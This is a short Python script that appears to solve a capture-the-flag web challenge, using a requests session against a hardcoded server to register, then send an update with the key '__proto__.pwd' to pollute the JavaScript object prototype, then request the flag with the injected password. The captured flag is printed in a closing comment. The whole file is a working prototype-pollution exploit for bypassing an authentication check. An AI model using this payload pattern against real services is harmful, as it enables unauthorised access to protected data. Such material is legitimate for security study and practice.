import requests
import random
from bs4 import BeautifulSoup
import re
import base64
s = requests.session() #保持同一个会话
def reg(url):
    url=url+"reg"
    r=s.get(url)
    print(r.text)

def update(url,data):
    url=url+"update"
    print(url)
    r=s.post(url,data=data)
    print(r.text)
def getflag(url,data):
    url=url+"getflag"
    r=s.post(url,data=data)
    print(r.text)

url="http://114.67.246.176:15937/"
reg(url)
data={"attrkey":"age","attrval":"40"}
update(url,data)
data={"attrkey":"__proto__.pwd","attrval":"222"}
update(url,data)
data={"password":"222","key":"pwd"}
getflag(url,data)

# flag{c0874e122c4cd1fae09e80cc7b507c3c}
